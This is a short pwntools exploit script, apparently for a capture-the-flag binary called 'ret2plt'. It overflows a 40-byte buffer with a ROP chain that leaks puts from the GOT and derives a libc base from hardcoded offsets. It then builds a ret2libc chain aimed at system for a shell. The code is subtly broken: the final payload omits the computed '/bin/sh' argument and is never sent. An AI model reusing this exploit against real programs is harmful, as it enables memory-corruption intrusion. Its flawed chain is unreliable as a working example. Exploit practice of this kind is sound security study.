#!/usr/bin/python3

from pwn import * 

elf = context.binary = ELF('./ret2plt')

io = process()
#ret2plt

pop_rdi = pack(0x00000000004012c3 )

puts = pack(elf.sym.puts) # find address of function

paylod = cyclic(40) + pop_rdi + pack(elf.got.puts) + puts + pack(elf.sym.main)
io.sendline(paylod)
#recv leak
leak = io.recvlines(2)[1]
leak_int = unpack(leak,'all')
print(hex(leak_int))
libc_base = leak_int -  0x00000000000735f0 
print (hex(libc_base))

#ret2libc
bin_sh = pack(libc_base +  196152)
ret = pack(0x000000000040101a)
system = pack(libc_base + 0x0000000000045e50)
payload = cyclic(40) + pop_rdi +  ret +  system
io.interactive()

